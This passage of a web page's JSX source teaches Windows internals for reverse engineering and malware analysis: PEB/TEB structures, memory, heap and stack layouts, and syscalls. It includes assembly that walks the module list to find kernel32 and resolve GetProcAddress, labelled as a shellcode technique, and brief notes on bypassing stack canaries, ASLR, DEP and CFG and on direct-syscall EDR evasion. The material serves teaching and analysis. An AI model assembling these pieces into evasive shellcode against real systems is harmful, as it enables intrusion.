; ===== x64 Assembly =====
; Get PEB pointer via GS segment
mov rax, gs:[0x60]        ; RAX = PEB pointer

; Check if being debugged
mov rax, gs:[0x60]
movzx eax, byte ptr [rax+0x02] ; BeingDebugged

; Get ImageBase
mov rax, gs:[0x60]
mov rax, [rax + 0x10]     ; ImageBaseAddress (offset differs in x64)

; ===== C/C++ Access =====
#include <winternl.h>
PPEB pPeb = (PPEB)__readfsdword(0x30);  // x86
PPEB pPeb = (PPEB)__readgsqword(0x60);  // x64

// Or using NtQueryInformationProcess
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, 
    &pbi, sizeof(pbi), NULL);
PPEB pPeb = pbi.PebBaseAddress;`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">TEB Structure (Thread Environment Block)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph>
                  Each thread has its own TEB containing thread-specific data: stack boundaries, exception chain (SEH on x86),
                  thread ID, TLS data, and the pointer to the process's PEB. The TEB is always at FS:[0] (x86) or GS:[0] (x64).
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                        <TableCell><strong>x86</strong></TableCell>
                        <TableCell><strong>x64</strong></TableCell>
                        <TableCell><strong>Field</strong></TableCell>
                        <TableCell><strong>Type</strong></TableCell>
                        <TableCell><strong>Description</strong></TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {tebFields.map((f) => (
                        <TableRow key={f.offset}>
                          <TableCell><code>{f.offset}</code></TableCell>
                          <TableCell><code>{f.offset64}</code></TableCell>
                          <TableCell><strong>{f.field}</strong></TableCell>
                          <TableCell><Typography variant="caption" sx={{ fontFamily: "monospace" }}>{f.type}</Typography></TableCell>
                          <TableCell>{f.description}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
                <CodeBlock title="TEB Access Examples">{`; Get TEB self-pointer (confirms TEB address)
mov eax, fs:[0x18]        ; x86: TEB->Self
mov rax, gs:[0x30]        ; x64: TEB->Self

; Get current Thread ID
mov eax, fs:[0x24]        ; x86: ClientId.UniqueThread
mov eax, gs:[0x48]        ; x64: ClientId.UniqueThread

; Get stack boundaries
mov eax, fs:[0x04]        ; x86: StackBase (top)
mov eax, fs:[0x08]        ; x86: StackLimit (bottom)

; Access SEH chain (x86 only)
mov eax, fs:[0x00]        ; ExceptionList head
; Walk chain: next = [eax], handler = [eax+4]

; Get LastError value
mov eax, fs:[0x34]        ; x86: LastErrorValue
mov eax, gs:[0x68]        ; x64: LastErrorValue`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">PEB_LDR_DATA (Loaded Modules)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph>
                  The PEB contains a pointer to PEB_LDR_DATA which maintains three doubly-linked lists of loaded modules (DLLs).
                  Shellcode typically walks these lists to find kernel32.dll or ntdll.dll and resolve API addresses dynamically.
                </Typography>
                
                <Alert severity="info" sx={{ mb: 2 }}>
                  <AlertTitle>Three Module Lists</AlertTitle>
                  <strong>InLoadOrderModuleList</strong>: Order modules were loaded (exe first).<br/>
                  <strong>InMemoryOrderModuleList</strong>: Order in memory (commonly used by shellcode).<br/>
                  <strong>InInitializationOrderModuleList</strong>: Order DllMain was called (ntdll, kernel32 first).
                </Alert>

                <CodeBlock title="Walk InMemoryOrderModuleList to Find kernel32.dll">{`; Classic 32-bit shellcode technique
find_kernel32:
    xor ecx, ecx              ; ECX = 0
    mov eax, fs:[ecx+0x30]    ; EAX = PEB
    mov eax, [eax+0x0C]       ; EAX = PEB->Ldr
    mov esi, [eax+0x14]       ; ESI = InMemoryOrderModuleList.Flink
    
next_module:
    mov ebx, [esi+0x10]       ; EBX = DllBase
    mov edi, [esi+0x28]       ; EDI = BaseDllName (UNICODE_STRING buffer)
    mov esi, [esi]            ; ESI = Flink (next entry)
    
    ; Check for kernel32.dll (compare first few chars)
    cmp dword ptr [edi+0x0C], 0x00320033  ; "32" in unicode
    jne next_module
    
    ; EBX now contains kernel32.dll base address
    
; ===== 64-bit Version =====
find_kernel32_x64:
    xor rcx, rcx
    mov rax, gs:[rcx+0x60]    ; RAX = PEB
    mov rax, [rax+0x18]       ; RAX = PEB->Ldr
    mov rsi, [rax+0x20]       ; RSI = InMemoryOrderModuleList.Flink
    
next_module_64:
    mov rbx, [rsi+0x20]       ; RBX = DllBase
    mov rdi, [rsi+0x50]       ; RDI = BaseDllName.Buffer
    mov rsi, [rsi]            ; RSI = next
    ; ... compare and continue

; ===== LDR_DATA_TABLE_ENTRY Structure =====
; InMemoryOrderLinks at +0x00 (LIST_ENTRY, walk via Flink/Blink)
; DllBase            at +0x10 (x86) / +0x20 (x64)
; EntryPoint         at +0x14 (x86) / +0x28 (x64)
; SizeOfImage        at +0x18 (x86) / +0x30 (x64)
; FullDllName        at +0x1C (x86) / +0x38 (x64) - UNICODE_STRING
; BaseDllName        at +0x24 (x86) / +0x48 (x64) - UNICODE_STRING`}</CodeBlock>

                <CodeBlock title="Resolve GetProcAddress from kernel32">{`; After finding kernel32 base in EBX:
find_function:
    mov eax, [ebx+0x3C]       ; e_lfanew
    mov edi, [ebx+eax+0x78]   ; Export Directory RVA
    add edi, ebx              ; EDI = Export Directory VA
    
    mov ecx, [edi+0x18]       ; NumberOfNames
    mov eax, [edi+0x20]       ; AddressOfNames RVA
    add eax, ebx              ; EAX = AddressOfNames VA
    
find_loop:
    dec ecx
    mov esi, [eax+ecx*4]      ; RVA of name
    add esi, ebx              ; VA of name
    
    ; Compare function name (e.g., "GetProcAddress")
    cmp dword ptr [esi], 0x50746547  ; "GetP"
    jne find_loop
    cmp dword ptr [esi+4], 0x41636f72 ; "rocA"  
    jne find_loop
    ; ... continue comparison
    
    ; Found! Get ordinal and address
    mov eax, [edi+0x24]       ; AddressOfNameOrdinals RVA
    add eax, ebx
    movzx ecx, word ptr [eax+ecx*2]  ; Ordinal
    
    mov eax, [edi+0x1C]       ; AddressOfFunctions RVA
    add eax, ebx
    mov eax, [eax+ecx*4]      ; Function RVA
    add eax, ebx              ; EAX = GetProcAddress VA`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">RTL_USER_PROCESS_PARAMETERS</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph>
                  The ProcessParameters field in PEB points to RTL_USER_PROCESS_PARAMETERS containing command line,
                  current directory, environment variables, and standard handles. Useful for understanding process context.
                </Typography>
                <CodeBlock title="Process Parameters Structure">{`RTL_USER_PROCESS_PARAMETERS:
  +0x000 MaximumLength
  +0x004 Length
  +0x008 Flags
  +0x00C DebugFlags
  +0x010 ConsoleHandle
  +0x014 ConsoleFlags
  +0x018 StandardInput
  +0x01C StandardOutput
  +0x020 StandardError
  +0x024 CurrentDirectory      ; CURDIR structure
  +0x030 DllPath              ; UNICODE_STRING
  +0x038 ImagePathName        ; UNICODE_STRING - full path to EXE
  +0x040 CommandLine          ; UNICODE_STRING - command line arguments
  +0x048 Environment          ; PVOID - pointer to environment block

; Access command line from PEB:
mov eax, fs:[0x30]           ; PEB
mov eax, [eax+0x10]          ; ProcessParameters
mov eax, [eax+0x40]          ; CommandLine.Buffer`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Memory Management */}
            <Box id="memory-mgmt" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Windows Memory Management</Typography>
                
                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  Windows implements a sophisticated <strong>virtual memory system</strong> that provides each process with 
                  the illusion of having its own private, contiguous address space. This abstraction layer sits between 
                  applications and physical RAM, enabling features like memory protection, memory-mapped files, copy-on-write 
                  optimization, and the ability to run programs larger than available physical memory through paging. For 
                  reverse engineers, understanding virtual memory is fundamental — every address you see in a debugger is a 
                  virtual address, and comprehending how these map to physical memory (or don't, in the case of paged-out 
                  memory) is essential for effective analysis.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  The Windows memory manager divides each process's virtual address space into two halves: <strong>user space</strong> 
                  and <strong>kernel space</strong>. On 32-bit systems, user mode code gets the lower 2GB (0x00000000 to 0x7FFFFFFF) 
                  while the kernel reserves the upper 2GB. On 64-bit systems, the division is much more dramatic — user mode 
                  processes have access to 128TB of virtual address space (with 48-bit addressing), while the kernel space is 
                  similarly sized. This separation is enforced by hardware (the CPU's supervisor bit) and ensures that user-mode 
                  code cannot directly access kernel memory — a protection that exploit developers constantly seek to bypass.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  Memory in Windows is managed at the <strong>page level</strong>, with the default page size being 4KB. Each 
                  page can have its own protection attributes: readable, writable, executable, or combinations thereof. The 
                  memory manager maintains page tables that map virtual addresses to physical addresses and track protection 
                  flags. When a program accesses memory, the CPU's Memory Management Unit (MMU) translates the virtual address 
                  using these page tables. If the page isn't in physical memory (a page fault), the memory manager either 
                  loads it from disk (for memory-mapped files or paged-out data) or raises an access violation if the access 
                  is invalid.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  For exploit development and malware analysis, the <strong>memory protection flags</strong> are critically important. 
                  The PAGE_EXECUTE_READWRITE (RWX) permission is a major red flag — legitimate code rarely needs memory that 
                  is simultaneously writable and executable. Shellcode, JIT compilers, and unpacking stubs require RWX memory, 
                  making it a key indicator of suspicious activity. Modern mitigations like Data Execution Prevention (DEP) 
                  prevent execution of non-executable pages, while technologies like Control Flow Guard (CFG) and Arbitrary 
                  Code Guard (ACG) add additional layers of protection that exploits must circumvent.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
                  The <strong>Windows heap</strong> and <strong>stack</strong> are the primary memory regions where vulnerabilities 
                  manifest. Stack buffer overflows can overwrite return addresses for control flow hijacking, while heap 
                  corruption can lead to arbitrary write primitives through metadata manipulation. Modern Windows includes 
                  numerous heap hardening features (safe unlinking, heap cookies, LFH randomization) and stack protections 
                  (stack canaries/GS, SAFESEH, SEHOP) that exploit developers must understand and bypass. The WinDbg commands 
                  <code>!heap</code> and <code>!address</code> are indispensable for analyzing memory layout during debugging.
                </Typography>

                <Alert severity="info" sx={{ mb: 3 }}>
                  <AlertTitle>Memory Layout Overview</AlertTitle>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={3}><Typography variant="body2"><strong>User Space:</strong> 0x00000000 - 0x7FFFFFFF (2GB, or 3GB with /3GB)</Typography></Grid>
                    <Grid item xs={12} md={3}><Typography variant="body2"><strong>Kernel Space:</strong> 0x80000000+ (shared across all processes)</Typography></Grid>
                    <Grid item xs={12} md={3}><Typography variant="body2"><strong>x64 User:</strong> 0 - 0x7FFFFFFFFFFF (128TB with 48-bit addressing)</Typography></Grid>
                    <Grid item xs={12} md={3}><Typography variant="body2"><strong>Page Size:</strong> 4KB (small), 2MB/1GB (large pages)</Typography></Grid>
                  </Grid>
                </Alert>

                <Accordion defaultExpanded>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Virtual Address Space Layout</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <CodeBlock title="x64 Process Memory Layout">{`┌─────────────────────────────────────────────────────────────────┐
│ 0x00007FFFFFFFFFFF ─┬─ User/Kernel Boundary                     │
├─────────────────────┼───────────────────────────────────────────┤
│                     │  Stack (grows down)                        │
│ 0x00007FF...        │  TEB, PEB                                  │
│                     │  Thread Local Storage (TLS)                │
├─────────────────────┼───────────────────────────────────────────┤
│                     │  Memory-Mapped Files                       │
│ 0x000007FF...       │  Shared DLLs (ntdll, kernel32, etc.)      │
│                     │  ASLR-randomized region                    │
├─────────────────────┼───────────────────────────────────────────┤
│                     │  Heap(s) - Process Heap, Private Heaps     │
│ 0x00000001...       │  VirtualAlloc regions                      │
│                     │  Mapped sections                           │
├─────────────────────┼───────────────────────────────────────────┤
│                     │  .data, .bss (writable data)               │
│ Image Base          │  .rdata (read-only data)                   │
│ (ASLR randomized)   │  .text (executable code)                   │
│                     │  PE Headers                                │
├─────────────────────┼───────────────────────────────────────────┤
│ 0x0000000000000000 ─┴─ NULL Pointer Guard (64KB reserved)       │
└─────────────────────────────────────────────────────────────────┘

Key Memory Regions for RE:
- Stack: Local variables, return addresses (ROP gadgets here)
- Heap:  Dynamic allocations, often contains sensitive data
- Image: PE sections, imports/exports
- DLLs:  System libraries, often hooked by security tools`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Memory Protection Flags</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <TableContainer>
                      <Table size="small">
                        <TableHead>
                          <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                            <TableCell><strong>Constant</strong></TableCell>
                            <TableCell><strong>Value</strong></TableCell>
                            <TableCell><strong>Description</strong></TableCell>
                            <TableCell><strong>RE Significance</strong></TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {[
                            { name: "PAGE_NOACCESS", val: "0x01", desc: "No access allowed", re: "Guard pages, unmapped memory" },
                            { name: "PAGE_READONLY", val: "0x02", desc: "Read only", re: ".rdata, imported data" },
                            { name: "PAGE_READWRITE", val: "0x04", desc: "Read/Write", re: ".data, heap, stack" },
                            { name: "PAGE_EXECUTE", val: "0x10", desc: "Execute only (rare)", re: "Code pages (uncommon)" },
                            { name: "PAGE_EXECUTE_READ", val: "0x20", desc: "Execute + Read", re: ".text section (normal)" },
                            { name: "PAGE_EXECUTE_READWRITE", val: "0x40", desc: "Execute + Read + Write", re: "⚠️ Shellcode, JIT, packers" },
                            { name: "PAGE_GUARD", val: "0x100", desc: "Guard page (one-shot)", re: "Stack guard, exception-based hooks" },
                            { name: "PAGE_NOCACHE", val: "0x200", desc: "Non-cached memory", re: "Device memory, rare in usermode" },
                          ].map((p) => (
                            <TableRow key={p.name}>
                              <TableCell><code>{p.name}</code></TableCell>
                              <TableCell><code>{p.val}</code></TableCell>
                              <TableCell>{p.desc}</TableCell>
                              <TableCell><Typography variant="body2" color="text.secondary">{p.re}</Typography></TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                    <Alert severity="warning" sx={{ mt: 2 }}>
                      <AlertTitle>Red Flag: PAGE_EXECUTE_READWRITE</AlertTitle>
                      Memory with RWX permissions is a strong indicator of shellcode, unpacking stubs, or JIT compilation.
                      Legitimate code rarely needs this. Modern mitigations like CFG and ACG restrict RWX allocations.
                    </Alert>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Windows Heap Internals</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography paragraph>
                      Windows uses a segment heap (Win10+) and the NT heap for memory allocation. Understanding heap structures
                      is essential for heap exploitation, malware analysis, and debugging memory corruption.
                    </Typography>
                    <CodeBlock title="Heap Structure & Exploitation">{`┌─────────────────────────────────────────────────────────────┐
│                     NT HEAP STRUCTURE                        │
├─────────────────────────────────────────────────────────────┤
│ HEAP (main structure at heap base)                          │
│   +0x000 Segment              ; First segment               │
│   +0x0C0 FreeListsInUse       ; Bitmap of used free lists   │
│   +0x158 FreeLists[128]       ; Free block lists by size    │
│   +0x178 LockVariable         ; Heap lock                   │
│   +0x198 CommitRoutine        ; Custom commit function      │
│                                                              │
│ HEAP_ENTRY (8/16 bytes per allocation)                      │
│   +0x000 Size                 ; Block size / 8              │
│   +0x002 Flags                ; BUSY, EXTRA_PRESENT, etc.   │
│   +0x003 SmallTagIndex        ; For heap debugging          │
│   +0x004 PreviousSize         ; Previous block size         │
│   +0x006 SegmentOffset        ; Segment index               │
│   +0x007 UnusedBytes          ; Padding byte count          │
└─────────────────────────────────────────────────────────────┘

Heap Exploitation Concepts:
1. Heap Overflow: Overwrite adjacent block metadata
2. Use-After-Free: Access freed memory, control allocation
3. Double Free: Corrupt free list, get same block twice
4. Heap Spray: Fill heap with controlled data (NOP sleds)

// Analyze heap in WinDbg:
!heap -stat                  ; Heap statistics
!heap -a <addr>              ; Analyze specific heap
!heap -flt s <size>          ; Find blocks of specific size
dt ntdll!_HEAP <addr>        ; Dump heap structure
dt ntdll!_HEAP_ENTRY <addr>  ; Dump block header`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Stack Layout & Exploitation</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <CodeBlock title="x64 Stack Frame Layout">{`┌─────────────────────────────────────────────────────────────┐
│                    x64 STACK FRAME                           │
├─────────────────────────────────────────────────────────────┤
│ [Higher Addresses]                                           │
│                                                              │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Caller's Stack Frame                                    │ │
│ │   Return Address (pushed by CALL)                       │ │
│ │   Shadow Space (32 bytes for RCX, RDX, R8, R9)         │ │
│ │   Stack Parameters (if > 4 args)                        │ │
│ └─────────────────────────────────────────────────────────┘ │
│                                                              │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Current Frame (callee)                                  │ │
│ │   Saved RBP (if frame pointer used)        ← RBP        │ │
│ │   Local Variables                                       │ │
│ │   Saved Non-volatile Registers (RBX, RSI, RDI, R12-R15)│ │
│ │   Red Zone (128 bytes, leaf functions only) ← RSP       │ │
│ └─────────────────────────────────────────────────────────┘ │
│                                                              │
│ [Lower Addresses - Stack grows DOWN]                        │
└─────────────────────────────────────────────────────────────┘

x64 Calling Convention (Microsoft):
- Args 1-4: RCX, RDX, R8, R9 (floats in XMM0-XMM3)
- Args 5+:  Stack (right-to-left)
- Return:   RAX (floats in XMM0)
- Volatile: RAX, RCX, RDX, R8-R11, XMM0-XMM5
- Non-vol:  RBX, RBP, RDI, RSI, RSP, R12-R15, XMM6-XMM15

Stack Canary (GS Cookie):
- Placed between locals and return address
- Checked before return: __security_check_cookie
- XOR'd with RSP to make prediction harder

// Bypass stack canary:
1. Information leak to read canary value
2. Overwrite SEH handler (if available)
3. Arbitrary write to bypass check entirely`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Memory Security Mitigations</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      {[
                        { name: "ASLR", desc: "Address Space Layout Randomization", detail: "Randomizes base addresses of EXE, DLLs, heap, stack. Bypass: info leak, partial overwrite, heap spray", flag: "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x40)" },
                        { name: "DEP/NX", desc: "Data Execution Prevention", detail: "Non-executable stack/heap. Bypass: ROP chains to call VirtualProtect or mprotect", flag: "IMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x100)" },
                        { name: "CFG", desc: "Control Flow Guard", detail: "Validates indirect call targets. Bypass: call valid targets, corrupt CFG bitmap", flag: "IMAGE_DLLCHARACTERISTICS_GUARD_CF (0x4000)" },
                        { name: "ACG", desc: "Arbitrary Code Guard", detail: "Prevents RWX memory, blocks VirtualProtect to +X. Very hard to bypass", flag: "SetProcessMitigationPolicy" },
                        { name: "CIG", desc: "Code Integrity Guard", detail: "Only signed DLLs can load. Blocks reflective DLL injection", flag: "SetProcessMitigationPolicy" },
                        { name: "CET", desc: "Control-flow Enforcement", detail: "Hardware shadow stack for return addresses (Intel CET). Very strong protection", flag: "CPU feature + OS support" },
                      ].map((m) => (
                        <Grid item xs={12} md={6} key={m.name}>
                          <Card variant="outlined" sx={{ height: "100%" }}>
                            <CardContent>
                              <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                                <Typography variant="subtitle1" fontWeight="bold" color="primary">{m.name}</Typography>
                                <Chip label={m.desc} size="small" variant="outlined" />
                              </Box>
                              <Typography variant="body2" paragraph>{m.detail}</Typography>
                              <Typography variant="caption" sx={{ fontFamily: "monospace", color: "text.secondary" }}>{m.flag}</Typography>
                            </CardContent>
                          </Card>
                        </Grid>
                      ))}
                    </Grid>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Memory Analysis Commands</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <CodeBlock title="WinDbg Memory Commands">{`# Memory inspection
db <addr>           ; Display bytes
dd <addr>           ; Display DWORDs  
dq <addr>           ; Display QWORDs
da/du <addr>        ; Display ASCII/Unicode string
dps <addr>          ; Display pointers with symbols

# Memory information
!address            ; Full address space layout
!address <addr>     ; Info about specific address
!vprot <addr>       ; Virtual protection info
!dh <module>        ; Display headers of module

# Memory search
s -a <start> L<len> "string"  ; Search ASCII
s -u <start> L<len> "string"  ; Search Unicode
s -b <start> L<len> <bytes>   ; Search bytes
s -d <start> L<len> <dword>   ; Search DWORD

# VAD (Virtual Address Descriptor) tree
!vad                ; Display VAD tree
!vad <addr> 1       ; Detailed VAD info

# Example: Find RWX regions (shellcode indicator)
.foreach (addr {!address -f:PAGE_EXECUTE_READWRITE}) { !address addr }

# Example: Search for PE header in memory
s -b 0 L7fffffff 4D 5A 90 00  ; Search for MZ header`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>
              </Paper>
            </Box>

            {/* Section: Syscalls & NTAPI */}
            <Box id="syscalls" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Windows Syscalls & Native API</Typography>
                
                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  <strong>System calls</strong> represent the fundamental boundary between user-mode applications and the Windows 
                  kernel. Every significant operation that a program performs — reading a file, allocating memory, creating a 
                  process, or establishing a network connection — ultimately requires crossing this boundary. The Windows API 
                  that programmers use (the Win32 API in kernel32.dll, user32.dll, etc.) is merely a high-level wrapper around 
                  lower-level functions in ntdll.dll, which in turn execute the actual system call instructions that transition 
                  into kernel mode. Understanding this layered architecture is crucial for both offensive security research and 
                  defensive malware analysis.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  The <strong>Native API</strong> (functions prefixed with Nt or Zw in ntdll.dll) represents the true system 
                  interface that Microsoft uses internally. These functions are largely undocumented, meaning Microsoft can 
                  change them between Windows versions without notice. Functions like <code>NtAllocateVirtualMemory</code>, 
                  <code>NtWriteVirtualMemory</code>, and <code>NtCreateThreadEx</code> provide the actual functionality that 
                  higher-level APIs like <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> 
                  build upon. The Native API offers more precise control and access to features not exposed through Win32.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  From a security perspective, the syscall boundary is where endpoint detection and response (EDR) products 
                  traditionally place their monitoring hooks. By intercepting calls to ntdll.dll functions, security software 
                  can observe and potentially block malicious operations like code injection, credential dumping, or lateral 
                  movement. This has led to an arms race: modern malware increasingly uses <strong>direct syscalls</strong> — 
                  executing the syscall instruction directly without going through ntdll.dll — to bypass these usermode hooks 
                  entirely. Techniques like SysWhispers, Hell's Gate, and Halo's Gate have become standard tools in the red 
                  team arsenal for syscall-based evasion.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
                  The syscall mechanism itself varies by architecture. On modern 64-bit Windows, the <code>syscall</code> 
                  instruction is used, which transfers execution to the kernel's system service dispatcher (KiSystemCall64) 
                  based on the syscall number in the EAX/RAX register. On 32-bit systems, either <code>sysenter</code> or 
                  <code>int 0x2E</code> is used depending on CPU capabilities. The critical challenge for direct syscall 
                  implementations is that syscall numbers are not stable — they change between Windows versions and even 
                  between builds. A syscall number that works on Windows 10 1909 may crash on Windows 11 23H2. This is why 
                  techniques that dynamically resolve syscall numbers at runtime (by reading from ntdll) have become essential.
                </Typography>

                <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
                  For reverse engineers analyzing malware, recognizing direct syscall patterns is critical. Telltale signs 
                  include the presence of <code>mov r10, rcx</code> and <code>mov eax, [number]</code> followed by <code>syscall</code> 
                  instruction sequences outside of ntdll.dll, or the use of known syscall evasion libraries. Defensive tools 
                  are adapting with kernel-mode ETW (Event Tracing for Windows) providers and syscall filtering mechanisms that 
                  cannot be bypassed from usermode. The cat-and-mouse game between syscall evasion and detection continues to 
                  evolve rapidly, making this knowledge essential for anyone working in Windows security.
                </Typography>

                <Alert severity="warning" sx={{ mb: 3 }}>
                  <AlertTitle>Why Syscalls Matter for Security</AlertTitle>
                  Security products (AV/EDR) typically hook Win32 APIs and ntdll functions. Direct syscalls bypass these hooks entirely.
                  Malware using direct syscalls is harder to detect and analyze with usermode tools. Kernel-level monitoring via ETW
                  and minifilter drivers is increasingly necessary to catch syscall-based evasion techniques.
                </Alert>

                <Accordion defaultExpanded>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Syscall Architecture</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <CodeBlock title="Windows System Call Flow">{`┌─────────────────────────────────────────────────────────────────┐
│                    USER MODE                                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Application                                                     │
│       │                                                          │
│       ▼                                                          │
│  kernel32.dll / kernelbase.dll                                  │
│  (CreateFile, VirtualAlloc, etc.)                               │
│       │                                                          │
│       ▼                                                          │
│  ntdll.dll   ←── EDR hooks often placed here                    │
│  (NtCreateFile, NtAllocateVirtualMemory)                        │
│       │                                                          │
│       │  syscall instruction (x64)                               │
│       │  int 0x2E or sysenter (x86)                             │
│       ▼                                                          │
├─────────────────────────────────────────────────────────────────┤
│                    KERNEL MODE                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ntoskrnl.exe / win32k.sys                                      │
│  (Nt* / Zw* functions)                                          │
│       │                                                          │
│       ▼                                                          │
│  Hardware / HAL                                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

Syscall Stub in ntdll.dll (x64):
  mov r10, rcx          ; Save first arg
  mov eax, <syscall#>   ; Syscall number (OS version specific!)
  syscall               ; Transition to kernel
  ret                   ; Return to caller

Syscall Numbers Change Per Build!
- Windows 10 1809: NtAllocateVirtualMemory = 0x18
- Windows 10 21H2: NtAllocateVirtualMemory = 0x18
- Windows 11:      NtAllocateVirtualMemory = 0x18
Always resolve dynamically or use version-specific tables.`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Common Native API Functions</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <TableContainer>
                      <Table size="small">
                        <TableHead>
                          <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                            <TableCell><strong>Native API (Nt*)</strong></TableCell>
                            <TableCell><strong>Win32 Equivalent</strong></TableCell>
                            <TableCell><strong>Purpose</strong></TableCell>
                          </TableRow>
                        </TableHead>
                        <TableBody>
                          {[
                            { nt: "NtAllocateVirtualMemory", win32: "VirtualAlloc(Ex)", purpose: "Allocate virtual memory" },
                            { nt: "NtProtectVirtualMemory", win32: "VirtualProtect(Ex)", purpose: "Change memory protection" },
                            { nt: "NtWriteVirtualMemory", win32: "WriteProcessMemory", purpose: "Write to process memory" },
                            { nt: "NtReadVirtualMemory", win32: "ReadProcessMemory", purpose: "Read from process memory" },
                            { nt: "NtCreateThreadEx", win32: "CreateRemoteThread", purpose: "Create thread (remote capable)" },
                            { nt: "NtOpenProcess", win32: "OpenProcess", purpose: "Open process handle" },
                            { nt: "NtCreateFile", win32: "CreateFile", purpose: "Create/open file" },
                            { nt: "NtQueryInformationProcess", win32: "GetProcessInformation", purpose: "Query process info (debug detection)" },
                            { nt: "NtSetInformationThread", win32: "SetThreadInformation", purpose: "Set thread info (hide from debugger)" },
                            { nt: "NtMapViewOfSection", win32: "MapViewOfFile", purpose: "Map section into address space" },
                            { nt: "NtUnmapViewOfSection", win32: "UnmapViewOfFile", purpose: "Unmap section (process hollowing)" },
                            { nt: "NtQueueApcThread", win32: "QueueUserAPC", purpose: "Queue APC (injection technique)" },
                          ].map((api) => (
                            <TableRow key={api.nt}>
                              <TableCell><code>{api.nt}</code></TableCell>
                              <TableCell><code>{api.win32}</code></TableCell>
                              <TableCell><Typography variant="body2">{api.purpose}</Typography></TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </TableContainer>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Direct Syscall Implementation</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography paragraph>
                      Direct syscalls bypass all usermode hooks by invoking the kernel directly. This technique is used by
                      advanced malware and red team tools. The main challenge is handling version-specific syscall numbers.
                    </Typography>
